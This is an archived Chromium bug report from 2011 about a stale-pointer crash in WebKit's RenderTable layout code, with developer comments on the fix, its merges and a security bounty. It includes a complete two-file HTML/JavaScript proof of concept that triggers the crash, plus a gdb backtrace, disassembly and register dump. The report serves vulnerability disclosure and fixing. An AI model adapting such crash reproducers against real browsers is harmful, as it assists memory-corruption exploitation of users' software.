# Stale pointer in WebCore::RenderTable::firstLineBoxBaseline

| Field | Value |
|-------|-------|
| **Issue ID** | [40087322](https://issues.chromium.org/issues/40087322) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-01-27 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Under certain circumstances, chromium will crash due to an attempt to fetch an instruction from null called from WebCore::RenderTable::firstLineBoxBaseline. This occurs after performing DOM insertions and removals on a document included in a second using an iframe.

**VERSION**  

Chrome Version: Chromium 8.0.552.237 Ubuntu 10.04 stable  

Operating System: Ubuntu 10.04 (64 bit)

**REPRODUCTION CASE**  

Two files are required to reproduce this vulnerability. The file outer.html essentially just creates an iframe with a src of inner.html.

outer.html:

<html>
<head><title>WebCore::RenderTable::firstLineBoxBaseline crash PoC (outer)</title></head>
<body>
<iframe width="200" height="200" src="inner.html"></iframe>
</body>
</html>

inner.html

<html><head><title>WebCore::RenderTable::firstLineBoxBaseline crash PoC (inner)</title></head>
<body onload="boom();">
<nobr>aaaaaaaaa</nobr>
<table>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</table>
<ol id="ol" style="display: -webkit-box; visibility: collapse;"><iframe id="n44">aaa</iframe><note id="n13" style="display: table-row-group;">a</note></ol>
<address>a</address>
<body>a</body>
<base id="base" style="display: table-cell;"></base>
<script type="text/javascript">
function reference(domNode) {
this.domNode = domNode;
}

function walk(a, currentPrefix, index, domNode) {  

if(domNode == null) return;  

newPrefix = currentPrefix + "\_" + index  

walk(a, currentPrefix, index + 1, domNode.nextSibling);  

walk(a, newPrefix, 0, domNode.firstChild);  

a[newPrefix] = new reference(domNode);  

}

function clear() {  

var a = new Array();  

walk(a, "", 0, document.body);  

for(key in a) {  

a[key].domNode.parentNode.removeChild(a[key].domNode);  

if(document.body) document.body.offsetTop;  

}  

}

function boom() {  

var tn = document.getElementById('ol');  

tn.parentNode.removeChild(tn); document.getElementById('base').appendChild(tn);  

window.setTimeout("clear();", 200);  

}  

</script></body></html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

A shortened version of the trace through the program using gdb is included below. The full version as well as the reproduction cases are attached.

$ chromium-browser --debug --single-process outer.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.zVhKyI  

GNU gdb (GDB) 7.1-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /usr/lib/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) run

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe3a7b700 (LWP 5543)]  

0x0000000000000000 in ?? ()  

(gdb) bt  

#0 0x0000000000000000 in ?? ()  

#1 0x00007ffff695fe28 in WebCore::RenderTable::firstLineBoxBaseline (  

this=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderTable.cpp:1109  

#2 0x00007ffff68d9308 in WebCore::RenderBlock::firstLineBoxBaseline (  

this=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:5205  

#3 0x00007ffff68d9308 in WebCore::RenderBlock::firstLineBoxBaseline (  

this=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:5205  

#4 0x00007ffff6963c2d in WebCore::RenderTableCell::baselinePosition (  

this=0x7ffff90d31e0, firstLine=false, isRootLineBox=96)  

at third\_party/WebKit/WebCore/rendering/RenderTableCell.cpp:302  

#5 0x00007ffff696ce94 in WebCore::RenderTableSection::calcRowHeight (  

this=0x7ffff90d33e8)  

at third\_party/WebKit/WebCore/rendering/RenderTableSection.cpp:365  

#6 0x00007ffff6960915 in WebCore::RenderTable::layout (this=0x7ffff90d32b8)  

at third\_party/WebKit/WebCore/rendering/RenderTable.cpp:285  

#7 0x00007ffff68e6a15 in WebCore::RenderBlock::layoutBlockChild (  

this=0x7ffff8f83750, child=0x7ffff90d32b8, marginInfo=...,  

previousFloatLogicalBottom=<value optimized out>,  

maxFloatLogicalBottom=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:1905

(gdb) frame 1  

#1 0x00007ffff695fe28 in WebCore::RenderTable::firstLineBoxBaseline (  

this=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderTable.cpp:1109  

1109 third\_party/WebKit/WebCore/rendering/RenderTable.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderTable.cpp  

(gdb) disassemble  

Dump of assembler code for function \_ZNK7WebCore11RenderTable20firstLineBoxBaselineEv:  

0x00007ffff695fdf0 <+0>: push %rbx  

0x00007ffff695fdf1 <+1>: mov 0xf8(%rdi),%rax  

0x00007ffff695fdf8 <+8>: test %rax,%rax  

0x00007ffff695fdfb <+11>: je 0x7ffff695fe30 <\_ZNK7WebCore11RenderTable20firstLineBoxBaselineEv+64>  

0x00007ffff695fdfd <+13>: mov 0xb8(%rax),%ebx  

0x00007ffff695fe03 <+19>: test %ebx,%ebx  

0x00007ffff695fe05 <+21>: jne 0x7ffff695fe19 <\_ZNK7WebCore11RenderTable20firstLineBoxBaselineEv+41>  

0x00007ffff695fe07 <+23>: mov $0x1,%edx  

0x00007ffff695fe0c <+28>: mov %rax,%rsi  

0x00007ffff695fe0f <+31>: callq 0x7ffff695fd00 <\_ZNK7WebCore11RenderTable12sectionBelowEPKNS\_18RenderTableSectionEb>  

0x00007ffff695fe14 <+36>: test %rax,%rax  

0x00007ffff695fe17 <+39>: je 0x7ffff695fe50 <\_ZNK7WebCore11RenderTable20firstLineBoxBaselineEv+96>  

0x00007ffff695fe19 <+41>: mov 0x44(%rax),%ebx  

0x00007ffff695fe1c <+44>: mov (%rax),%rdx  

0x00007ffff695fe1f <+47>: mov %rax,%rdi  

0x00007ffff695fe22 <+50>: callq \*0x658(%rdx)  

=> 0x00007ffff695fe28 <+56>: add %ebx,%eax  

---Type <return> to continue, or q <return> to quit---q  

Quit  

(gdb) i r  

rax 0x7ffff8f83d70 140737370406256  

rbx 0x0 0  

rcx 0x10 16  

rdx 0x7ffff8f84060 140737370407008  

rsi 0x0 0  

rdi 0x7ffff8f83d70 140737370406256  

rbp 0x7ffff90d33e8 0x7ffff90d33e8  

rsp 0x7fffe3a79930 0x7fffe3a79930  

r8 0x0 0  

r9 0x0 0  

r10 0x7ffff6a41b68 140737331338088  

r11 0x0 0  

r12 0x0 0  

r13 0x0 0  

r14 0x0 0  

r15 0x0 0  

rip 0x7ffff695fe28 0x7ffff695fe28 <WebCore::RenderTable::firstLineBoxBaseline() const+56>  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0  

(gdb) print \*this  

Cannot access memory at address 0x0  

(gdb)

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 9.3 KB)
- [outer.html](attachments/outer.html) (text/html; charset=us-ascii, 179 B)
- [inner.html](attachments/inner.html) (text/html; charset=us-ascii, 1.3 KB)

## Timeline

### [Deleted User] (2011-01-27)

This is reproducible with Google Chrome 10.0.648.6 (Official Build 72589) on Windows.



### in...@chromium.org (2011-01-27)

m_firstBody is stale.

### in...@chromium.org (2011-01-27)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-01-28)

filed webkit bug - https://bugs.webkit.org/show_bug.cgi?id=53265

### in...@chromium.org (2011-01-28)

committed - http://trac.webkit.org/changeset/76915

### sc...@gmail.com (2011-01-29)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-02-01)

@MartyBarbella: thanks!! Nice report. This bug provisionally qualifies for a $1000 Chromium Security Reward. Thanks for the clean repro. Generally, the smaller the repro, the greater the chance of getting rewarded at the higher $1000 level :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### ma...@gmail.com (2011-02-02)

Thanks as well. Once again, nice job with a quick fix.

### in...@chromium.org (2011-02-09)

merged to m9 in http://trac.webkit.org/changeset/78087.

still needs m10 merge.

### in...@chromium.org (2011-02-09)

merged to m10 in r78113.

### sc...@gmail.com (2011-03-04)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/71115?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087322)*
